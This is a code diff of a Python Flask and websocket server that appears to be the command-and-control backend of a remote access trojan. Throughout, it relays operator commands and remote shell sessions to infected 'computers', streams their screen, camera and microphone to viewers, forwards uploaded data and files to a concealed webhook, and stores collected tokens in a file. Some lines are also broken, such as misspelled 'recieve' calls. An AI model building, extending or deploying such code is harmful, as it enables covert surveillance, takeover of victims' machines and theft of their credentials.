@@ -1,25 +1,22 @@
-import multiprocessing, cloudscraper, threading, hashlib, urllib3, zipfile, random, flask, json, time, os
+import multiprocessing, threading, hashlib, random, json, time, os
+import cloudscraper, zipfile, urllib3, flask
+from flask import Flask, request, send_file, jsonify
+from flask_sock import Sock
 
 
 scraper = cloudscraper.create_scraper()
 
-while True:
-    try:
-        from flask import Flask, request, send_file, jsonify
-        from flask_sock import Sock
-
-        break
-    except:
-        os.system("pip install flask-sock")
-        os.system("pip install flask-tor")
-
-
 app = Flask(__name__)
 sock = Sock(app)
-command = {}
 
-shell_commands = {}                
-shell_response = {}
+_computers = {}
+clients = []
+
+shell_computers = {}
+shell_clients = {}
+
+files_commands = {}
+files_response = {}
 
 screen_recv_ws = {}
 camera_recv_ws = {}
@@ -36,34 +33,17 @@ def zipdir(path, ziph):
                 os.path.relpath(os.path.join(root, file), os.path.join(path, "..")),
             )
 
-
-def ping(ws, computer):
-    global connectedComputers
-    tries = 5
-    while True:
-        time.sleep(1)
+def send_all_clients(message):
+    global clients
+    for client in clients:
         try:
-            tries -= 1
-            ws.send("ping")
+            client.send(message)
         except:
-            if tries < 0:
-                try:
-                    connectedComputers.remove(computer)
-                except:
-                    pass
-                try:
-                    ws.close()
-                except:
-                    pass
-                print("Bye!")
-                break
-
+            clients.remove(client)
 
 @sock.route("/api/ws/commands")
 def commands(ws):
-    global connectedComputers
-    global command
-
+    global _computers
     print("User Connected")
     data = ws.receive()
     encoded = hashlib.sha256(data.encode()).hexdigest()
@@ -79,23 +59,105 @@ def commands(ws):
         else:
             break
 
-    print(computer)
-    connectedComputers.append(computer)
-    threading.Thread(target=ping, args=(ws, computer)).start()
+    _computers[computer] = ws
+
+    send_all_clients( json.dumps( list(_computers.keys()) ) )
 
     while True:
+        try:
+            ws.send('ping')
+        except:
+            print("User Disconnected")
+            del _computers[computer]
+          
+            send_all_clients( json.dumps( list(_computers.keys()) ) )
 
-        if not command:
+@sock.route("/api/ws/computers")
+def computers(ws):
+    global computers, clients
+  
+    data = ws.receive()
+    encoded = hashlib.sha256(data.encode()).hexdigest()
+    print(encoded)
+  
+    if not encoded == key:
+        ws.close()
+
+    clients.append(ws)
+
+    while True:
+        try:
+            recv_data = json.loads(ws.receive())
+        except:
+            clients.remove(ws)
+            break
+
+        computer = recv_data['target']
+        command = recv_data['code']
+
+        if computer not in _computers:
+            continue
+          
+        _computers[computer].send(command)
+
+@sock.route("/api/ws/readShell")
+def readshell(ws):
+    global shell_computers, shell_computers
+    data = ws.receive()
+    encoded = hashlib.sha256(data.encode()).hexdigest()
+    print(encoded)
+    if not encoded == key:
+        ws.close()
+
+    computer = ws.receive()
+
+    shell_clients[computer] = ws
+  
+    while True:
+        try:
+            command = ws.recieve()
+        except:
+           del shell_clients[computer]
+           break
+          
+        if computer not in shell_computers:
             continue
 
-        if computer == command["target"]:
-            if not computer in connectedComputers:
-                connectedComputers.append(computer)
+        try:
+            shell_computers[computer].send(command)
+        except:
+           del shell_computers[computer]  
+           continue
 
-            ws.send(command["code"])
-            command = {}
+@sock.route("/api/ws/shell")
+def shell(ws):
+    global shell_computers, shell_computers
+    data = ws.receive()
+    encoded = hashlib.sha256(data.encode()).hexdigest()
+    print("SHELL")
+    if not encoded == key:
+        ws.close()
 
+    computer = ws.receive()
 
+    shell_computers[computer] = ws
+  
+    while True:
+          try:
+              response = ws.recieve()
+          except:
+               del shell_computers[computer]
+               break
+
+          if computer not in shell_clients:
+             continue
+
+          try:
+              shell_clients[computer].send(response)
+          except:
+              del shell_clients[computer]  
+              continue
+          
 @sock.route("/api/ws/camera")
 def wscamera(ws):
     global camera_recv_ws
@@ -108,7 +170,7 @@ def wscamera(ws):
     computer = ws.receive()
 
     if not computer in camera_recv_ws:
-      camera_recv_ws[computer] = []
+        camera_recv_ws[computer] = []
 
     while True:
         image = ws.receive()
@@ -117,7 +179,6 @@ def wscamera(ws):
                 _ws.send(image)
             except:
                 camera_recv_ws[computer].remove(_ws)
-
 
 @sock.route("/api/ws/screen")
 def wsscreen(ws):
@@ -131,7 +192,7 @@ def wsscreen(ws):
     computer = ws.receive()
 
     if not computer in screen_recv_ws:
-      screen_recv_ws[computer] = []
+        screen_recv_ws[computer] = []
 
     while True:
         image = ws.receive()
@@ -140,7 +201,6 @@ def wsscreen(ws):
                 _ws.send(image)
             except:
                 screen_recv_ws[computer].remove(_ws)
-
 
 @sock.route("/api/ws/audio")
 def wsaudio(ws):
@@ -154,7 +214,7 @@ def wsaudio(ws):
     computer = ws.receive()
 
     if not computer in audio_recv_ws:
-      audio_recv_ws[computer] = []
+        audio_recv_ws[computer] = []
 
     while True:
         image = ws.receive()
@@ -200,7 +260,7 @@ def screen(ws):
     computer = ws.receive()
 
     if not computer in screen_recv_ws:
-      screen_recv_ws[computer] = []
+        screen_recv_ws[computer] = []
 
     screen_recv_ws[computer].append(ws)
     while True:
@@ -209,7 +269,6 @@ def screen(ws):
         except:
             screen_recv_ws[computer].remove(ws)
             return
-
 
 @sock.route("/api/ws/playAudio")
 def audio(ws):
@@ -223,10 +282,10 @@ def audio(ws):
     computer = ws.receive()
 
     if not computer in audio_recv_ws:
-      audio_recv_ws[computer] = []
+        audio_recv_ws[computer] = []
 
     if not computer in screen_recv_ws:
-      screen_recv_ws[computer] = []
+        screen_recv_ws[computer] = []
 
     audio_recv_ws[computer].append(ws)
     while True:
@@ -236,103 +295,9 @@ def audio(ws):
             audio_recv_ws[computer].remove(ws)
             return
 
-def update(ws):
-    global connectedComputers
-    old = None
-    while True:
-        if not old == connectedComputers:
-            old = connectedComputers[:]
-        else:
-            continue
-
-        newComputers = {"computers": connectedComputers}
-        if len(newComputers["computers"]) > 1:
-            newComputers["computers"] = list(set(connectedComputers))
-        ws.send(newComputers)
-
-
-@sock.route("/api/ws/computers")
-def computers(ws):
-    global connectedComputers
-    global command
-    data = ws.receive()
-    encoded = hashlib.sha256(data.encode()).hexdigest()
-    print(encoded)
-    if not encoded == key:
-        ws.close()
-
-    threading.Thread(target=update, args=(ws,)).start()
-    while True:
-
-        command = json.loads(ws.receive())
-        print(command)
-
-
-@sock.route("/api/ws/readShell")
-def readshell(ws):
-    global shell_response
-    data = ws.receive()
-    encoded = hashlib.sha256(data.encode()).hexdigest()
-    print(encoded)
-    if not encoded == key:
-        ws.close()
-
-    computer = ws.receive()
-    threading.Thread(
-        target=listen,
-        args=(
-            ws,
-            computer,
-        ),
-    ).start()
-    while True:
-
-        if computer in shell_response and shell_response[computer]:
-            print()
-            ws.send(shell_response[computer])
-            shell_response[computer] = None
-
-
-def listen(ws, computer):
-    global shell_commands
-    while True:
-        shell_commands[computer] = ws.receive()
-
-
-def send(ws, computer):
-    global shell_commands
-    while True:
-        if computer in shell_commands and shell_commands[computer]:
-            ws.send(shell_commands[computer])
-            shell_commands[computer] = None
-
-
-@sock.route("/api/ws/shell")
-def shell(ws):
-    global shell_response
-    data = ws.receive()
-    encoded = hashlib.sha256(data.encode()).hexdigest()
-    print("SHELL")
-    if not encoded == key:
-        ws.close()
-
-    computer = ws.receive()
-
-    threading.Thread(
-        target=send,
-        args=(
-            ws,
-            computer,
-        ),
-    ).start()
-    while True:
-        shell_response[computer] = ws.receive()
-
-
 @app.route("/webhook", methods=["POST", "GET"])
-def webhook():  
-    webhook = os.environ['webhook']
-
+def webhook():
+    webhook = os.environ["webhook"]
 
     if request.environ.get("HTTP_X_FORWARDED_FOR") is None:
         ip = request.environ["REMOTE_ADDR"]
@@ -341,8 +306,8 @@ def webhook():
 
     if request.method == "GET":
 
-        response = scraper.get(webhook)
-        return {}, response.status_code
+        response = scraper.get(webhook).text
+        return response
 
     elif request.method == "POST":
         data = request.form
@@ -354,25 +319,30 @@ def webhook():
             is_json = False
 
         try:
-           files = dict(request.files)
+            files = dict(request.files)
         except Exception as e:
-           files = {}
+            files = {}
 
         if files:
-          try:
-              files = {key: (file.filename, file.read(), "application/octet-stream") for key, file in files.items()}
-          except Exception as e:
-              files = {}
-
-      
+            try:
+                files = {
+                    file.filename(): (key, file.read()) for key, file in files.items()
+                }
+            except Exception as e:
+                files = {}
+                print(e, 5)
 
         if is_json:
             response = scraper.post(webhook, json=data, files=files)
         else:
             response = scraper.post(webhook, data=data, files=files)
 
-        return {}
+        print(is_json, data, response.text)
+        if response:
+            return response.text, response.status_code
 
+        else:
+            return {}, 200
 
 @app.route("/logs", methods=["POST", "GET"])
 def logs():
@@ -408,7 +378,6 @@ def logs():
 
         return data
 
-
 @app.route("/tokens", methods=["POST", "GET"])
 def tokens():
     try:
@@ -425,12 +394,12 @@ def tokens():
         token = request.form["token"]
 
         if token not in keysFile["keys"]:
-          with open("tokens.json", "w+") as f:
-              keys = keysFile["keys"]
-              keys.append(token)
-              keysFile["keys"] = keys
-              json.dump(keysFile, f, indent=1)
-              f.close()
+            with open("tokens.json", "w+") as f:
+                keys = keysFile["keys"]
+                keys.append(token)
+                keysFile["keys"] = keys
+                json.dump(keysFile, f, indent=1)
+                f.close()
 
         return "", 204
 
@@ -439,7 +408,6 @@ def tokens():
 
         keys = keysFile["keys"]
         return keys
-
 
 @app.errorhandler(404)
 def page_not_found(e):
@@ -450,24 +418,20 @@ def page_not_found(e):
     print(ip)
     return "", 404
 
-
 @app.errorhandler(500)
 def error(e):
     print(e)
     return "", 404
-
 
 @app.errorhandler(405)
 def notallowed(e):
     print(e)
     return "", 404
 
-
 @app.errorhandler(400)
-def notallowed(e):
+def client_error(e):
     print(e, 400)
     return "", 404
 
-
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", debug=True, port=8080)
+    app.run()
